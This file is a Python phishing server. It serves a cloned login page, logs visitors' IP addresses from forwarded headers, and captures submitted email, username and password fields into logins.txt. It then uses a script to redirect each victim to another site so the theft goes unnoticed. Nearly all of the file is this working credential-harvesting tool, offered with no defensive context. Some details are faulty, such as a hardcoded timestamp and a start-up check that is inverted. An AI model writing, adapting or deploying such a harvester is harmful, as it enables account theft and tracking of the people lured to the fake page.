from http.server import HTTPServer, BaseHTTPRequestHandler
from colorama import Fore, Style
from io import BytesIO
import urllib.request
import logging
import re
from datetime import datetime

class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
    
    ips = []

    def run():
        #Here is where the server runs
        running = False
        httpd = HTTPServer(('0.0.0.0', 8000), SimpleHTTPRequestHandler)
        while not running:
            print('.::Listening on port 8000...\n')
            httpd.serve_forever()

    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        file = open('site/index.html','r')
        readfile = file.readlines()
        for lines in readfile:
            self.wfile.write(lines.encode())
        self.get_ip()
        try:
            print(Fore.RED+'[+]IP Found:',self.ips[-1])
            print(Style.RESET_ALL)
        except IndexError:
            pass

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        body = self.rfile.read(content_length)
        self.send_response(200)
        self.end_headers()
        response = BytesIO()
        response.write(body)
        values = response.getvalue()
        self.getCredentials(values)

    def get_ip(self):
        log = str(self.headers).split('\n')
        for lines in log:
            if re.search('^'+'X-Forwarded-For',lines):
                address = lines.split('X-Forwarded-For: ')
                if not address[1] in self.ips:
                    date = self.get_time()
                    self.ips.append(address[1])
                    file = open('ips.txt','a+')
                    file.write('Date: '+str(date)+' IP: '+str(address[1])+'\n')

    def get_time(self):
        timestamp = 1545730073
        timenow = datetime.fromtimestamp(timestamp)
        return timenow

    def log_message(self, format, *args):
        logging.error(self.headers)

    def getCredentials(self, values):
        post = values.decode('UTF-8')
        readpost = post.strip('&')
        forms = ['email','user','login','pass'] #Possibles forms to get the credentials
        readpost = readpost.split('&')
        count = 0
        possibles = []
        file = open('logins.txt','a+')
        for line in readpost:
            for c in forms:
                if c in line and re.search("^"+str(c),line) and len(line) > 0:
                    possibles.append(line)
                    count +=1
                    if count >= 2:
                        print('\n' + Fore.RED + "=" * 15 + " Possible Credentials " + "=" * 15)
                        print('[+].::',possibles)
                        print("=" * 52 + "\n")
                        print(Style.RESET_ALL)
                        date = self.get_time()
                        file.write(str(date)+' '+str(possibles)+'\n')
                        count = 0
                        possibles = []
        file.close()
        print("[!] Redirecting...")
        self.redirect()

    def redirect(self):
        urlf = open('site/redirect.txt','r')
        url = urlf.readlines()
        redir = "<script>window.location.href=\"%s\"</script>" % (url[0])
        self.wfile.write(redir.encode())
        print('[+] Done!')

if not __name__ == '__main__':
    SimpleHTTPRequestHandler.run()
